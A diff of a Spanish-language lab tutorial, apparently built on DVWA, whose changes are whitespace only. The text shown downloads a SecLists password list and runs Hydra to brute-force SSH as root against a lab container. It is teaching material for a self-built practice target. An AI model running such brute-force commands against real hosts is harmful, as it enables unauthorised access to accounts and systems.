@@ -8,7 +8,8 @@ PRIMERA PARTE
 ===============================================================
 1
 
-Si usa https://labs.play-with-docker.com/ se recomienda usar 
+Si usa https://labs.play-with-docker.com/ se recomienda usar
+
 
 
 
@@ -42,18 +43,25 @@ Ponemos el password: computer (que se configuro en el ejemplo, especificamente e
 Ahora en otra instancia, usamos lo que hay en la carpeta HYDRA, usamos el archivo Dockerfile, luego
 
 git clone https://github.com/cesarbobadilla/dvwa.git
+
 cd dvwa  
+
 git checkout BruteForce
+
 docker build -t kali-hydra HYDRA/.
-docker run -it kali-hydra /bin/bash 
+
+docker run -it kali-hydra /bin/bash
+
 
 Una vez que estamos en la shell del contenedor, descargamos un diccionario de contraseñas de 10000 posibilidades
 
 curl https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10000.txt > passlist.txt
 
+
 Y ahora ejecutamos Hydra para que adivine la contraseña configurada, dandole previamente el usuario root y de referencia el diccionario descargado passlist.txt. En el ejemplo consideramos que el ssh esta corriendo en la 192.168.0.6
 
-hydra -s 2222 -l root -P passlist.txt 192.168.0.6 -t 4 -V ssh 
+hydra -s 2222 -l root -P passlist.txt 192.168.0.6 -t 4 -V ssh
+
 
 Debería seguir ejecutando hasta que vea algo como
 
